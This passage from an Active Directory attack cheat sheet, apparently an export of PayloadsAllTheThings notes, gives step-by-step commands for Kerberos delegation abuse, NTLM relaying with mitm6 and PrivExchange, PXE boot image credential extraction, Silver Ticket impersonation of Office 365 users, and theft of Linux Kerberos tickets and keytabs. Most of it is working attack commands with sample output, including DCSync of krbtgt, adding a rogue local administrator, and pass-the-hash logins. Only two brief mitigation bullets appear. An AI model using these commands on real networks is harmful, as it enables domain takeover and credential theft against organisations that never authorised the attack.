grep TRUSTED_FOR_DELEGATION domain_computers.grep</code></pre><p id="ce822785-7c1a-4b6e-b6c3-ffa096f13d24" class="">NOTE: Domain controllers usually have unconstrained delegation enabled</p><h3 id="cc1d18e0-cdb7-4f75-a64a-7eec83ff2a93" class="">Monitor with Rubeus</h3><p id="cee09c38-ce4d-4741-bdee-898c3f66eeaf" class="">Monitor incoming connections from Rubeus.</p><pre id="12729ad3-9ccd-43b9-a133-7a252c06fc11" class="code"><code>Rubeus.exe monitor /interval:1</code></pre><h3 id="2c7de729-8144-47d6-9fd9-076477c6e6d5" class="">Force a connect back from the DC</h3><blockquote id="8ce46878-483c-479d-8459-cd16d77fe8fa" class="">SpoolSample is a PoC to coerce a Windows host to authenticate to an arbitrary server using a &quot;feature&quot; in the MS-RPRN RPC interface</blockquote><pre id="4b987546-e356-4799-9c25-3bae56b3e056" class="code"><code># From https://github.com/leechristensen/SpoolSample
.\SpoolSample.exe VICTIM-DC-NAME UNCONSTRAINED-SERVER-DC-NAME
.\SpoolSample.exe DC01.HACKER.LAB HELPDESK.HACKER.LAB
# DC01.HACKER.LAB is the domain controller we want to compromise
# HELPDESK.HACKER.LAB is the machine with delegation enabled that we control.</code></pre><p id="21106fc1-e634-4af6-9370-97872680f81c" class="">If the attack worked you should get a TGT of the domain controller.</p><h3 id="a3a54513-337d-49a4-a335-06058c043d62" class="">Load the ticket</h3><p id="0eb451fd-fd5c-4016-8cd9-9fc8572d1998" class="">Extract the base64 TGT from Rubeus output and load it to our current session.</p><pre id="d0e5fbae-2113-4188-ba8d-b8b4979485c4" class="code"><code>.\Rubeus.exe asktgs /ticket:&lt;ticket base64&gt; /ptt</code></pre><p id="44b4138b-4099-4a5d-a1bf-b6e504f94b52" class="">Alternatively you could also grab the ticket using Mimikatz : <code>mimikatz # sekurlsa::tickets</code></p><p id="c3194862-1523-426f-b8b0-b728861f4b15" class="">Then you can use DCsync or another attack : <code>mimikatz # lsadump::dcsync /user:HACKER\krbtgt</code></p><h3 id="093dde24-1e90-4edd-a3ef-cbd26fd5a9bd" class="">Mitigation</h3><ul id="355dfe08-de04-453e-9e76-70e1bada312b" class="bulleted-list"><li>Ensure sensitive accounts cannot be delegated</li></ul><ul id="4616a785-381a-4421-8461-9b1c27e53656" class="bulleted-list"><li>Disable the Print Spooler Service</li></ul><h3 id="0f86527f-413a-4d4f-9448-73a5e543b784" class="">Kerberos Resource Based Constrained Delegation</h3><p id="a1f3915c-fb2b-41c7-b6ac-a5a5c56544ed" class="">Resource-based Constrained Delegation was introduced in Windows Server 2012.</p><blockquote id="a091e342-d6ff-4cae-93bb-4d2be056f090" class="">The user sends a TGS to access the service (&quot;Service A&quot;), and if the service is allowed to delegate to another pre-defined service (&quot;Service B&quot;), then Service A can present to the authentication service the TGS that the user provided and obtain a TGS for the user to Service B.  https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html</blockquote><ol id="32381baa-854a-4c0b-a6d1-77ff0e7692b5" class="numbered-list" start="1"><li>Import <strong>Powermad</strong> and <strong>Powerview</strong><pre id="47e43768-9f37-496e-9a55-03f696961b47" class="code"><code>PowerShell.exe -ExecutionPolicy Bypass
Import-Module .\powermad.ps1
Import-Module .\powerview.ps1</code></pre></li></ol><ol id="f45056f4-f0c4-4cc9-883f-e35602e7e45b" class="numbered-list" start="2"><li>Get user SID<pre id="2a86b68f-dac0-4159-b978-5bc856c34664" class="code"><code>$AttackerSID = Get-DomainUser SvcJoinComputerToDom -Properties objectsid | Select -Expand objectsid
$ACE = Get-DomainObjectACL dc01-ww2.factory.lan | ?{$_.SecurityIdentifier -match $AttackerSID}
$ACE
ConvertFrom-SID $ACE.SecurityIdentifier</code></pre></li></ol><ol id="6a327770-c3a8-4d5b-b3fd-637dca5604bd" class="numbered-list" start="3"><li>Abuse <strong>MachineAccountQuota</strong> to create a computer account and set an SPN for it<pre id="2bad2a26-add2-434f-85d0-7dd661f7c0ef" class="code"><code>New-MachineAccount -MachineAccount swktest -Password $(ConvertTo-SecureString &#x27;Weakest123*&#x27; -AsPlainText -Force)</code></pre></li></ol><ol id="7ea1428f-628f-4994-b185-1c9ed1f85794" class="numbered-list" start="4"><li>Rewrite DC&#x27;s <strong>AllowedToActOnBehalfOfOtherIdentity</strong> properties<pre id="5bfb056b-c09f-4020-b159-46d20d056797" class="code"><code>$ComputerSid = Get-DomainComputer swktest -Properties objectsid | Select -Expand objectsid

$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList &quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))&quot;
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer dc01-ww2.factory.lan | Set-DomainObject -Set @{&#x27;msds-allowedtoactonbehalfofotheridentity&#x27;=$SDBytes}
$RawBytes = Get-DomainComputer dc01-ww2.factory.lan -Properties &#x27;msds-allowedtoactonbehalfofotheridentity&#x27; | select -expand msds-allowedtoactonbehalfofotheridentity
$Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0
$Descriptor.DiscretionaryAcl</code></pre></li></ol><ol id="47f22b8d-9612-4c5c-8f21-9f8a2a007eb6" class="numbered-list" start="5"><li>Use Rubeus to get hash from password<pre id="d839dcfc-3224-4b80-bcec-da12625c5ff6" class="code"><code>Rubeus.exe hash /password:&#x27;Weakest123*&#x27; /user:swktest  /domain:factory.lan
[*] Input password             : Weakest123*
[*] Input username             : swktest
[*] Input domain               : factory.lan
[*] Salt                       : FACTORY.LANswktest
[*]       rc4_hmac             : F8E064CA98539B735600714A1F1907DD
[*]       aes128_cts_hmac_sha1 : D45DEADECB703CFE3774F2AA20DB9498
[*]       aes256_cts_hmac_sha1 : 0129D24B2793DD66BAF3E979500D8B313444B4D3004DE676FA6AFEAC1AC5C347
[*]       des_cbc_md5          : BA297CFD07E62A5E</code></pre></li></ol><ol id="db74311e-00fa-47a4-b16f-c57661bdfd1a" class="numbered-list" start="6"><li>Impersonate domain admin using our newly created machine account<pre id="0a1e5c6d-13e9-4c31-a216-6ed307b3ffbe" class="code"><code>.\Rubeus.exe s4u /user:swktest$ /rc4:F8E064CA98539B735600714A1F1907DD /impersonateuser:Administrator /msdsspn:cifs/dc01-ww2.factory.lan /ptt

[*] Impersonating user &#x27;Administrator&#x27; to target SPN &#x27;cifs/dc01-ww2.factory.lan&#x27;
[*] Using domain controller: DC01-WW2.factory.lan (172.16.42.5)
[*] Building S4U2proxy request for service: &#x27;cifs/dc01-ww2.factory.lan&#x27;
[*] Sending S4U2proxy request
[+] S4U2proxy success!
[*] base64(ticket.kirbi) for SPN &#x27;cifs/dc01-ww2.factory.lan&#x27;:

    doIGXDCCBligAwIBBaEDAgEWooIFXDCCBVhhggVUMIIFUKADAgEFoQ0bC0ZBQ1RPUlkuTEFOoicwJaAD
    AgECoR4wHBsEY2lmcxsUZGMwMS[...]PMIIFC6ADAgESoQMCAQOiggT9BIIE
    LmZhY3RvcnkubGFu

[*] Action: Import Ticket
[+] Ticket successfully imported!</code></pre></li></ol><h3 id="b6b73f64-62f4-4ca0-b7cd-2462ede43863" class="">Relay delegation with mitm6</h3><p id="b0deffa9-b493-41d6-a50b-2742f1ad3f11" class="">Prerequisites:</p><ul id="ce30b02c-5e3d-45e5-9b67-914b86692416" class="bulleted-list"><li>IPv6 enabled (Windows prefers IPV6 over IPv4)</li></ul><ul id="060b4a28-616c-47db-af4d-c6212a090c99" class="bulleted-list"><li>LDAP over TLS (LDAPS)</li></ul><blockquote id="b0da0a9e-66b2-4848-b32a-dba558f8be6b" class="">ntlmrelayx relays the captured credentials to LDAP on the domain controller, uses that to create a new machine account, print the account&#x27;s name and password and modifies the delegation rights of it.</blockquote><pre id="362e4968-ed34-4208-a05d-144c7bb81ada" class="code"><code>git clone https://github.com/fox-it/mitm6.git 
cd /opt/tools/mitm6
pip install .

mitm6 -hw ws02 -d lab.local --ignore-nofqnd
ntlmrelayx.py -t ldaps://dc01.lab.local --delegate-access --no-smb-server -wh attacker-wpad
then use rubeus with s4u to relay the delegation</code></pre><h3 id="15278e2c-9b03-49e2-a824-c076642121c0" class="">PrivExchange attack</h3><p id="57981cd5-4d09-42e9-bef3-23546dc1bdfc" class="">Exchange your privileges for Domain Admin privs by abusing Exchange.‚ö†Ô∏è You need a shell on a user account with a mailbox.</p><ol id="2d4fe75e-c896-49c1-af63-b8c3e889b798" class="numbered-list" start="1"><li>Exchange server hostname or IP address<pre id="b4108f6f-5a23-49d7-af46-1caeeea0699c" class="code"><code>pth-net rpc group members &quot;Exchange Servers&quot; -I dc01.domain.local -U domain/username</code></pre></li></ol><ol id="5a048670-560d-4a45-83be-7b4eab941049" class="numbered-list" start="2"><li>Relay of the Exchange server authentication and privilege escalation (using ntlmrelayx from Impacket).<pre id="603547b8-d5e9-4375-9076-9e929f6940d6" class="code"><code>ntlmrelayx.py -t ldap://dc01.domain.local --escalate-user username</code></pre></li></ol><ol id="dc3ff174-21d3-4edd-9617-7df4efe4c4dd" class="numbered-list" start="3"><li>Subscription to the push notification feature (using privexchange.py or powerPriv), uses the credentials of the current user to authenticate to the Exchange server. Forcing the Exchange server&#x27;s to send back its NTLMv2 hash to a controlled machine.<pre id="0603a2b4-fb3b-4da3-8da9-6858898babfb" class="code"><code># https://github.com/dirkjanm/PrivExchange/blob/master/privexchange.py
python privexchange.py -ah xxxxxxx -u xxxx -d xxxxx
python privexchange.py -ah 10.0.0.2 mail01.domain.local -d domain.local -u user_exchange -p pass_exchange

# https://github.com/G0ldenGunSec/PowerPriv 
powerPriv -targetHost corpExch01 -attackerHost 192.168.1.17 -Version 2016</code></pre></li></ol><ol id="e6b445e1-c82f-4bb7-ad96-cdf97e426fd7" class="numbered-list" start="4"><li>Profit using secretdumps from Impacket, the user can now perform a dcsync and get another user&#x27;s NTLM hash<pre id="a767ac06-cb30-4018-a7ba-f7fe0b01ce0f" class="code"><code>python secretsdump.py xxxxxxxxxx -just-dc
python secretsdump.py lab/buff@192.168.0.2 -ntds ntds -history -just-dc-ntlm</code></pre></li></ol><ol id="f660d186-70d4-4d34-936d-18497522c9d7" class="numbered-list" start="5"><li>Clean your mess and restore a previous state of the user&#x27;s ACL<pre id="e1687370-bfb7-438d-8a95-620ec72b6fbc" class="code"><code>python aclpwn.py --restore ../aclpwn-20190319-125741.restore</code></pre></li></ol><p id="be42a4db-92f6-4454-9961-c81bd84ac0d9" class="">Alternatively you can use the Metasploit module</p><p id="0cb1a2a2-0763-4f53-bdf7-62c5c6c42f27" class=""><a href="https://github.com/rapid7/metasploit-framework/pull/11420"><code>use auxiliary/scanner/http/exchange_web_server_pushsubscription</code></a></p><p id="7a413d4b-36dc-4642-887e-f724edbf962e" class="">Alternatively you can use an all-in-one tool : Exchange2domain.</p><pre id="ab482e09-3472-466c-9282-68fa37d6ebfd" class="code"><code>git clone github.com/Ridter/Exchange2domain 
python Exchange2domain.py -ah attackterip -ap listenport -u user -p password -d domain.com -th DCip MailServerip
python Exchange2domain.py -ah attackterip -u user -p password -d domain.com -th DCip --just-dc-user krbtgt MailServerip</code></pre><h3 id="d0cfdbd4-68ce-41da-b352-c40465886cb0" class="">PXE Boot image attack</h3><p id="dcaa2dac-4227-4d0d-817c-d872fa3fd9aa" class="">PXE allows a workstation to boot from the network by retrieving an operating system image from a server using TFTP (Trivial FTP) protocol. This boot over the network allows an attacker to fetch the image and interact with it.</p><ul id="20408b9d-2e22-437e-be05-89140117c473" class="bulleted-list"><li>Press <strong>[F8]</strong> during the PXE boot to spawn an administrator console on the deployed machine.</li></ul><ul id="1b0d6dd3-bd5c-4b99-adfd-71f5fc050e66" class="bulleted-list"><li>Press <strong>[SHIFT+F10]</strong> during the initial Windows setup process to bring up a system console, then add a local administrator or dump SAM/SYSTEM registry.<pre id="97511ccd-088e-4477-97c1-43d7ab15954f" class="code"><code>net user hacker Password123! /add
net localgroup administrators /add hacker</code></pre></li></ul><ul id="968ade2e-63ed-4c20-be06-c206f95dea59" class="bulleted-list"><li>Extract the pre-boot image (wim files) using <a href="https://github.com/wavestone-cdt/powerpxe">PowerPXE.ps1 (https://github.com/wavestone-cdt/powerpxe)</a> and dig through it to find default passwords and domain accounts.<pre id="67590bee-6537-4b8f-8616-35f84691ec61" class="code"><code># Import the module
PS &gt; Import-Module .\PowerPXE.ps1

# Start the exploit on the Ethernet interface
PS &gt; Get-PXEcreds -InterfaceAlias Ethernet
PS &gt; Get-PXECreds -InterfaceAlias ¬´ lab 0 ¬ª 

# Wait for the DHCP to get an address
&gt;&gt; Get a valid IP adress
&gt;&gt;&gt; &gt;&gt;&gt; DHCP proposal IP address: 192.168.22.101
&gt;&gt;&gt; &gt;&gt;&gt; DHCP Validation: DHCPACK
&gt;&gt;&gt; &gt;&gt;&gt; IP address configured: 192.168.22.101

# Extract BCD path from the DHCP response
&gt;&gt; Request BCD File path
&gt;&gt;&gt; &gt;&gt;&gt; BCD File path:  \Tmp\x86x64{5AF4E332-C90A-4015-9BA2-F8A7C9FF04E6}.bcd
&gt;&gt;&gt; &gt;&gt;&gt; TFTP IP Address:  192.168.22.3

# Download the BCD file and extract wim files
&gt;&gt; Launch TFTP download
&gt;&gt;&gt;&gt; Transfer succeeded.
&gt;&gt; Parse the BCD file: conf.bcd
&gt;&gt;&gt;&gt; Identify wim file : \Boot\x86\Images\LiteTouchPE_x86.wim
&gt;&gt;&gt;&gt; Identify wim file : \Boot\x64\Images\LiteTouchPE_x64.wim
&gt;&gt; Launch TFTP download
&gt;&gt;&gt;&gt; Transfer succeeded.

# Parse wim files to find interesting data
&gt;&gt; Open LiteTouchPE_x86.wim
&gt;&gt;&gt;&gt; Finding Bootstrap.ini
&gt;&gt;&gt;&gt; &gt;&gt;&gt;&gt; DeployRoot = \\LAB-MDT\DeploymentShare$
&gt;&gt;&gt;&gt; &gt;&gt;&gt;&gt; UserID = MdtService
&gt;&gt;&gt;&gt; &gt;&gt;&gt;&gt; UserPassword = Somepass1</code></pre></li></ul><h3 id="8ad78314-2e86-4047-b0cb-679bfb2eac32" class="">Impersonating Office 365 Users on Azure AD Connect</h3><p id="ccd27c4d-3c5f-4031-b5e6-bcabf2cbd227" class="">Prerequisites:</p><ul id="00541d82-c931-44b2-9a78-eefb47bf26bd" class="bulleted-list"><li>Obtain NTLM password hash of the AZUREADSSOACC account<pre id="ffc2c535-4c48-4b02-8964-51a8d78a62f2" class="code"><code>mimikatz.exe &quot;lsadump::dcsync /user:AZUREADSSOACC$&quot; exit</code></pre></li></ul><ul id="7b5ddc71-fc74-460a-a027-01a18f52038c" class="bulleted-list"><li>AAD logon name of the user we want to impersonate (userPrincipalName or mail)<pre id="8f16cad2-019e-4f27-abef-9599d48c2999" class="code"><code>elrond@contoso.com</code></pre></li></ul><ul id="fca2ed31-e38c-4e57-a873-26cb60c6c7b9" class="bulleted-list"><li>SID of the user we want to impersonate<pre id="cced3caf-ba52-4eae-8880-9d04f166ddb0" class="code"><code>S-1-5-21-2121516926-2695913149-3163778339-1234</code></pre></li></ul><p id="6dbdd256-47b4-4a91-a19a-9df2456bbf81" class="">Create the Silver Ticket and inject it into Kerberos cache:</p><pre id="ac261392-b036-4dab-9da2-62cab07f5143" class="code"><code>mimikatz.exe &quot;kerberos::golden /user:elrond
/sid:S-1-5-21-2121516926-2695913149-3163778339 /id:1234
/domain:contoso.local /rc4:f9969e088b2c13d93833d0ce436c76dd
/target:aadg.windows.net.nsatc.net /service:HTTP /ptt&quot; exit</code></pre><p id="394dcf4f-3805-4e32-914d-4d39e408015b" class="">Launch Mozilla Firefox, go to about:config</p><pre id="88e207e6-60c4-44f2-a0fa-97744809e39d" class="code"><code>network.negotiate-auth.trusted-uris=&quot;https://aadg.windows.net.nsatc.net,https://autologon.microsoftazuread-sso.com&quot;.</code></pre><p id="474394f8-9253-4f97-a9ca-250329b14238" class="">Navigate to any web application that is integrated with our AAD domain. Once at the Office365 logon screen, fill in the user name, while leaving the password field empty. Then press TAB or ENTER.</p><h2 id="0fdf9222-a963-4807-bb63-ac7bcb3f9600" class="">Linux Active Directory</h2><h3 id="e4057303-e875-4567-adaf-d34bfc2cbdaf" class="">CCACHE ticket reuse from /tmp</h3><p id="cd4f74fc-ea7e-4b29-81c9-0fb9e0a8dae0" class="">List the current ticket used for authentication with <code>env | grep KRB5CCNAME</code>. The format is portable and the ticket can be reused by setting the environment variable with <code>export KRB5CCNAME=/tmp/ticket.ccache</code></p><blockquote id="26dbc2ba-5a33-49db-81dd-2487b0e8a2bc" class="">When tickets are set to be stored as a file on disk, the standard format and type is a CCACHE file. This is a simple binary file format to store Kerberos credentials. These files are typically stored in /tmp and scoped with 600 permissions</blockquote><h3 id="a35f1059-6569-48a2-b8cb-50278a03b746" class="">CCACHE ticket reuse from keyring</h3><p id="5bc2f226-c92f-4b00-a68c-4d5307b6ff89" class="">Tool to extract Kerberos tickets from Linux kernel keys : <a href="https://github.com/TarlogicSecurity/tickey">https://github.com/TarlogicSecurity/tickey</a></p><pre id="c7a3fedf-a229-40d2-b1f2-24d662e53fdd" class="code"><code>[root@Lab-LSV01 /]# /tmp/tickey -i
[*] krb5 ccache_name = KEYRING:session:sess_%{uid}
[+] root detected, so... DUMP ALL THE TICKETS!!
[*] Trying to inject in tarlogic[1000] session...
[+] Successful injection at process 25723 of tarlogic[1000],look for tickets in /tmp/__krb_1000.ccache
[*] Trying to inject in velociraptor[1120601115] session...
[+] Successful injection at process 25794 of velociraptor[1120601115],look for tickets in /tmp/__krb_1120601115.ccache
[*] Trying to inject in trex[1120601113] session...
[+] Successful injection at process 25820 of trex[1120601113],look for tickets in /tmp/__krb_1120601113.ccache
[X] [uid:0] Error retrieving tickets</code></pre><h3 id="f0a362a0-6ff1-4dac-bf4b-edd8602368cc" class="">CCACHE ticket reuse from keytab</h3><pre id="a27c8b31-6a43-42c8-a125-8a7ead67a9f0" class="code"><code>git clone https://github.com/its-a-feature/KeytabParser
python KeytabParser.py /etc/krb5.keytab
klist -k /etc/krb5.keytab</code></pre><h3 id="77a6fa8a-72e0-4c44-8f54-7eadd79e7c3c" class="">Extract accounts from /etc/krb5.keytab</h3><p id="d55024a0-8bb9-44a0-8447-169bcd99d6c8" class="">The service keys used by services that run as root are usually stored in the keytab file /etc/krb5.keytab. This service key is the equivalent of the service&#x27;s password, and must be kept secure.</p><p id="ec6ff1cb-6798-4e8a-ac9d-7980aa7d1d36" class="">Use <a href="https://adoptopenjdk.net/?variant=openjdk13&amp;jvmVariant=hotspot"><code>klist</code></a> to read the keytab file and parse its content. The key that you see when the <a href="https://cwiki.apache.org/confluence/display/DIRxPMGT/Kerberos+EncryptionKey">key type</a> is 23 is the actual NT Hash of the user.</p><pre id="56cdf302-c6cc-452c-84d3-8d7dfd8092e5" class="code"><code>$ klist.exe -t -K -e -k FILE:C:\Users\User\downloads\krb5.keytab
[...]
[26] Service principal: host/COMPUTER@DOMAIN
	 KVNO: 25
	 Key type: 23
	 Key: 6b3723410a3c54692e400a5862256e0a
	 Time stamp: Oct 07,  2019 09:12:02
[...]</code></pre><p id="956b76a3-591a-4596-ab24-39c792c42338" class="">On macOS you can use <code>bifrost</code>.</p><pre id="7919b26f-b080-4adc-b41d-95910d00b8b4" class="code"><code>./bifrost -action dump -source keytab -path test</code></pre><p id="fee31d22-4bc1-4612-a937-b31925e3a6b7" class="">Connect to the machine using the account and the hash with CME.</p><pre id="6b42b84e-fc74-49eb-bac3-00d6d0df647b" class="code"><code>$ crackmapexec 10.XXX.XXX.XXX -u &#x27;COMPUTER$&#x27; -H &quot;6b3723410a3c54692e400a5862256e0a&quot; -d &quot;DOMAIN&quot;
CME          10.XXX.XXX.XXX:445 HOSTNAME-01   [+] DOMAIN\COMPUTER$ 6b3723410a3c54692e400a5862256e0a</code></pre><h2 id="3f071cd2-aa4a-4c8c-b25e-55e4a858431a" class="">References</h2><ul id="a75be153-11f6-49da-81be-9fb06143e6e0" class="bulleted-list"><li><a href="file:///C:/hackz/PayloadsAllTheThings-master/PayloadsAllTheThings-master/Methodology%20and%20Resources/#https://www.dsinternals.com/en/impersonating-office-365-users-mimikatz/">Impersonating Office 365 Users With Mimikatz - January 15, 2017 - Michael Grafnetter</a></li></ul><ul id="574db0fd-d727-406a-ac41-2cbe4cc9192c" class="bulleted-list"><li><a href="https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin">Abusing Exchange: One API call away from Domain Admin - Dirk-jan Mollema</a></li></ul><ul id="4db5001e-d384-477e-8477-2fbb4b88716e" class="bulleted-list"><li><a href="https://www.exploit-db.com/docs/english/45051-abusing-kerberos---kerberoasting.pdf">Abusing Kerberos: Kerberoasting - Haboob Team</a></li></ul><ul id="1df6edc3-4238-49c1-8902-6d18288d9a74" class="bulleted-list"><li><a href="https://alsid.com/company/news/abusing-s4u2self-another-sneaky-active-directory-persistence">Abusing S4U2Self: Another Sneaky Active Directory Persistence - Alsid</a></li></ul><ul id="c6e3ebe5-c284-490a-8a36-59d9dd745a46" class="bulleted-list"><li><a href="https://blog.netspi.com/attacks-against-windows-pxe-boot-images/">Attacks Against Windows PXE Boot Images - February 13th, 2018 - Thomas Elling</a></li></ul><ul id="2f247aad-5848-44eb-9d8a-50f1773a03f1" class="bulleted-list"><li><a href="https://1337red.wordpress.com/building-and-attacking-an-active-directory-lab-with-powershell/">BUILDING AND ATTACKING AN ACTIVE DIRECTORY LAB WITH POWERSHELL - @myexploit2600 &amp; @5ub34x</a></li></ul><ul id="8945a005-a7fa-4014-ac13-0e0625cc4f4d" class="bulleted-list"><li><a href="https://chryzsh.gitbooks.io/darthsidious/content/building-a-lab/building-a-lab/building-a-small-lab.html">Becoming Darth Sidious: Creating a Windows Domain (Active Directory) and hacking it - @chryzsh</a></li></ul><ul id="a328b1bb-dd5f-4546-8b81-ec1f5cd8553a" class="bulleted-list"><li><a href="https://microsoftrnd.co.il/Press%20Kit/BlueHat%20IL%20Decks/BenjaminDelpy.pdf">BlueHat IL - Benjamin Delpy</a></li></ul><ul id="897724fa-1be2-40c3-80e7-524763cafb1f" class="bulleted-list"><li><a href="https://connect.ed-diamond.com/MISC/MISC-103/Compromission-des-postes-de-travail-grace-a-LAPS-et-PXE">COMPROMISSION DES POSTES DE TRAVAIL GR√ÇCE √Ä LAPS ET PXE MISC n¬∞ 103 - mai 2019 - R√©mi Escourrou, Cyprien Oger</a></li></ul><ul id="f08e3418-c8ed-42d5-a06e-1622e6a6500f" class="bulleted-list"><li><a href="https://github.com/l0ss/Chump2Trump/blob/master/ChumpToTrump.pdf">Chump2Trump - AD Privesc talk at WAHCKon 2017 - @l0ss</a></li></ul><ul id="b9d6371a-31fa-4c8a-b3b7-bb79c03935c9" class="bulleted-list"><li><a href="https://bohops.com/2018/03/26/diskshadow-the-return-of-vss-evasion-persistence-and-active-directory-database-extraction/">DiskShadow The return of VSS Evasion Persistence and AD DB extraction</a></li></ul><ul id="a2b60b40-ab36-4e14-b197-a90966ad3321" class="bulleted-list"><li><a href="https://hausec.com/2017/10/21/domain-penetration-testing-using-bloodhound-crackmapexec-mimikatz-to-get-domain-admin/">Domain Penetration Testing: Using BloodHound, Crackmapexec, &amp; Mimikatz to get Domain Admin</a></li></ul><ul id="4b498f39-b2dc-4c49-8b41-e5abc76aaa86" class="bulleted-list"><li><a href="https://pentestlab.blog/2018/07/04/dumping-domain-password-hashes/">Dumping Domain Password Hashes - Pentestlab</a></li></ul><ul id="55b2d40b-3c5e-4ce8-9789-4c769fa95c0a" class="bulleted-list"><li><a href="https://zachgrace.com/posts/exploiting-ms14-068/">Exploiting MS14-068 with PyKEK and Kali - 14 DEC 2014 - ZACH GRACE @ztgrace</a></li></ul><ul id="dda4be86-77d6-4b8b-9f8e-39353cdaa763" class="bulleted-list"><li><a href="https://chryzsh.github.io/exploiting-privexchange/">Exploiting PrivExchange - April 11, 2019 - @chryzsh</a></li></ul><ul id="90f18d94-40c1-4d1a-b810-d7e8934c3158" class="bulleted-list"><li><a href="https://www.riccardoancarani.it/exploiting-unconstrained-delegation/">Exploiting Unconstrained Delegation - Riccardo Ancarani - 28 APRIL 2019</a></li></ul><ul id="315938b0-19bf-44f4-9b2c-f4cb260f8ec6" class="bulleted-list"><li><a href="https://adsecurity.org/?p=2288">Finding Passwords in SYSVOL &amp; Exploiting Group Policy Preferences</a></li></ul><ul id="f01d1e2d-12d4-499a-aff2-4c0b7c8b12e7" class="bulleted-list"><li><a href="https://speakerdeck.com/ropnop/fun-with-ldap-kerberos-and-msrpc-in-ad-environments">Fun with LDAP, Kerberos (and MSRPC) in AD Environments</a></li></ul><ul id="2d05ecf4-6d21-459e-b835-38e1d568140b" class="bulleted-list"><li><a href="https://byt3bl33d3r.github.io/getting-the-goods-with-crackmapexec-part-1.html">Getting the goods with CrackMapExec: Part 1, by byt3bl33d3r</a></li></ul><ul id="1b711858-ccc7-41e2-ab29-8373800bbb43" class="bulleted-list"><li><a href="https://byt3bl33d3r.github.io/getting-the-goods-with-crackmapexec-part-2.html">Getting the goods with CrackMapExec: Part 2, by byt3bl33d3r</a></li></ul><ul id="947e8086-102f-466e-b43e-0126a46fdfbd" class="bulleted-list"><li><a href="https://pentestlab.blog/2018/04/09/golden-ticket/">Golden ticket - Pentestlab</a></li></ul><ul id="4ea7f88d-abd3-4569-b4c4-341002e60888" class="bulleted-list"><li><a href="https://bluescreenofjeff.com/2017-05-23-how-to-pass-the-ticket-through-ssh-tunnels/">How To Pass the Ticket Through SSH Tunnels - bluescreenofjeff</a></li></ul><ul id="8a219b46-afe7-427a-a395-f7100e35e347" class="bulleted-list"><li><a href="https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1">Hunting in Active Directory: Unconstrained Delegation &amp; Forests Trusts - Roberto Rodriguez - Nov 28, 2018</a></li></ul><ul id="03a0dd18-0f31-4670-a652-8b1a094d985e" class="bulleted-list"><li><a href="https://powersploit.readthedocs.io/en/latest/Recon/Invoke-Kerberoast/">Invoke-Kerberoast - Powersploit Read the docs</a></li></ul><ul id="dafe5b6a-46b8-46a4-953e-72439c37c509" class="bulleted-list"><li><a href="https://room362.com/post/2016/kerberoast-pt1/">Kerberoasting - Part 1 - Mubix ‚ÄúRob‚Äù Fuller</a></li></ul><ul id="c195e426-0426-40e8-ab2c-22bdb87dcd01" class="bulleted-list"><li><a href="https://michael-eder.net/post/2018/native_rdp_pass_the_hash/">Passing the hash with native RDP client (mstsc.exe)</a></li></ul><ul id="a67aad7a-d45b-4277-903f-8e4aeb5d0af2" class="bulleted-list"><li><a href="https://blog.varonis.com/pen-testing-active-directory-environments-part-introduction-crackmapexec-powerview/">Pen Testing Active Directory Environments - Part I: Introduction to crackmapexec (and PowerView)</a></li></ul><ul id="376c4f18-35eb-434a-adc8-2904ebae11a5" class="bulleted-list"><li><a href="https://blog.varonis.com/pen-testing-active-directory-environments-part-ii-getting-stuff-done-with-powerview/">Pen Testing Active Directory Environments - Part II: Getting Stuff Done With PowerView</a></li></ul><ul id="4430a37e-f3bc-4ee2-a249-4b56fd24d15d" class="bulleted-list"><li><a href="https://blog.varonis.com/pen-testing-active-directory-environments-part-iii-chasing-power-users/">Pen Testing Active Directory Environments - Part III: Chasing Power Users</a></li></ul><ul id="1e76aba3-c3d9-49c9-8c03-2e18aa432891" class="bulleted-list"><li><a href="https://blog.varonis.com/pen-testing-active-directory-environments-part-iv-graph-fun/">Pen Testing Active Directory Environments - Part IV: Graph Fun</a></li></ul><ul id="95a8352d-f459-45c8-a4a4-bab153a6ea87" class="bulleted-list"><li><a href="https://blog.varonis.com/pen-testing-active-directory-v-admins-graphs/">Pen Testing Active Directory Environments - Part V: Admins and Graphs</a></li></ul><ul id="421db399-6589-4d31-8c81-04a0aa5e3cbc" class="bulleted-list"><li><a href="https://blog.varonis.com/pen-testing-active-directory-part-vi-final-case/">Pen Testing Active Directory Environments - Part VI: The Final Case</a></li></ul><ul id="71f76e42-e28a-4422-a31f-6c1ce1269760" class="bulleted-list"><li><a href="https://hausec.com/2019/03/05/penetration-testing-active-directory-part-i/">Penetration Testing Active Directory, Part I - March 5, 2019 - Hausec</a></li></ul><ul id="8c1aa2cb-d1e0-47f2-bb7a-b0f05238ed20" class="bulleted-list"><li><a href="https://hausec.com/2019/03/12/penetration-testing-active-directory-part-ii/">Penetration Testing Active Directory, Part II - March 12, 2019 - Hausec</a></li></ul><ul id="95530e51-7f87-4d39-9ec4-80b0b142d922" class="bulleted-list"><li><a href="https://0metasecurity.com/post-oscp-part-2/">Post-OSCP Series Part 2 - Kerberoasting - 16 APRIL 2019 - Jon Hickman</a></li></ul><ul id="ffbf3c5d-11dd-49ef-bf75-82ec02f3a73e" class="bulleted-list"><li><a href="https://stealingthe.network/quick-guide-to-installing-bloodhound-in-kali-rolling/">Quick Guide to Installing Bloodhound in Kali-Rolling - James Smith</a></li></ul><ul id="56995d1c-6792-4a92-a407-26124a3aae95" class="bulleted-list"><li><a href="http://blog.redxorblue.com/2019/01/red-teaming-made-easy-with-exchange.html">Red Teaming Made Easy with Exchange Privilege Escalation and PowerPriv - Thursday, January 31, 2019 - Dave</a></li></ul><ul id="7643caf2-34e2-4df1-8487-46ff97615c7b" class="bulleted-list"><li><a href="https://www.harmj0y.net/blog/activedirectory/roasting-as-reps/">Roasting AS-REPs - January 17, 2017 - harmj0y</a></li></ul><ul id="021b4cbc-5918-4763-9b80-6a9f9729d9e7" class="bulleted-list"><li><a href="https://medium.com/@adam.toscher/top-five-ways-i-got-domain-admin-on-your-internal-network-before-lunch-2018-edition-82259ab73aaa">Top Five Ways I Got Domain Admin on Your Internal Network before Lunch (2018 Edition) - Adam 